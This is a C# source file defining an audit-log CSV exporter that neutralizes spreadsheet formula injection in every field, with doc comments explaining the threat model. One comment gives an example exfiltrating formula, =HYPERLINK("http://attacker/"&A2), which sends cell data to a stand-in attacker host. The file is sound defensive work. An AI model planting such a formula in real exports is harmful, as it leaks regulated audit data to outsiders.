using System.Globalization;
using System.Text;

namespace Sati.Contracts.V1;

/// <summary>One exported audit row, in the order the file presents it.</summary>
public sealed record AuditCsvRow(
    Guid EventId,
    DateTime OccurredAtUtc,
    int ActorUserId,
    string ActorDisplayName,
    string Action,
    string ResourceType,
    string? ResourceId,
    string CorrelationId);

/// <summary>
/// Sole owner of the audit-export file format, shared by the API export and the
/// desktop's local export so the two cannot drift.
///
/// The export is regulatory evidence. It is opened in Excel, LibreOffice, or
/// Sheets by an Admin, an auditor, or a state reviewer, which makes it an
/// execution surface as well as a document:
///
///   RFC 4180 quoting makes a field PARSE correctly. It does not stop a
///   spreadsheet from EVALUATING it. Excel strips the surrounding quotes on
///   import and then treats a leading '=', '+', '-', '@', tab, or carriage
///   return as the start of a formula. So a value like
///   =HYPERLINK("http://attacker/"&A2) becomes live content in the reader's
///   application, not text in a cell.
///
/// The untrusted field here is ActorDisplayName. A Supervisor may set the
/// display name of any case manager they supervise, and that name is written
/// into an export that only an Admin can run — so without neutralization a
/// lower-privileged user can place executable content in a higher-privileged
/// user's file. ExportReason is caller-supplied free text as well.
///
/// Every field is neutralized on the way out, not just the ones known to be
/// untrusted today, so adding a column cannot silently reintroduce the hole.
/// </summary>
public static class AuditCsv
{
    public const string Header =
        "ExportReason,ExportedAtUtc,EventId,OccurredAtUtc,ActorUserId,ActorDisplayName," +
        "Action,ResourceType,ResourceId,CorrelationId";

    // Leading characters a spreadsheet may treat as the start of a formula.
    // Tab and the newline characters are included because they are stripped
    // before evaluation, exposing whatever follows them.
    private static readonly char[] FormulaTriggers = ['=', '+', '-', '@', '\t', '\r', '\n'];

    public static string Build(
        IEnumerable<AuditCsvRow> rows,
        string reason,
        DateTime exportedAtUtc)
    {
        var csv = new StringBuilder();
        csv.AppendLine(Header);
        foreach (var row in rows)
        {
            csv.AppendLine(string.Join(',', new[]
            {
                Field(reason),
                Field(exportedAtUtc.ToString("O", CultureInfo.InvariantCulture)),
                Field(row.EventId.ToString()),
                Field(row.OccurredAtUtc.ToString("O", CultureInfo.InvariantCulture)),
                Field(row.ActorUserId.ToString(CultureInfo.InvariantCulture)),
                Field(row.ActorDisplayName),
                Field(row.Action),
                Field(row.ResourceType),
                Field(row.ResourceId),
                Field(row.CorrelationId)
            }));
        }

        return csv.ToString();
    }

    /// <summary>
    /// Neutralizes a value for spreadsheet import, then quotes it for RFC 4180.
    /// Both steps are required and neither substitutes for the other.
    /// </summary>
    public static string Field(string? value)
    {
        var text = value ?? string.Empty;
        if (text.Length > 0 && Array.IndexOf(FormulaTriggers, text[0]) >= 0)
        {
            // A leading apostrophe is the spreadsheet convention for "this cell
            // is literal text". The original characters are preserved after it,
            // so the export stays faithful to what was recorded.
            text = "'" + text;
        }

        return $"\"{text.Replace("\"", "\"\"", StringComparison.Ordinal)}\"";
    }

    /// <summary>
    /// True when a value would be evaluated rather than displayed. Exposed so
    /// tests and reviewers can assert the property directly.
    /// </summary>
    public static bool WouldSpreadsheetEvaluate(string? value) =>
        !string.IsNullOrEmpty(value) && Array.IndexOf(FormulaTriggers, value[0]) >= 0;
}
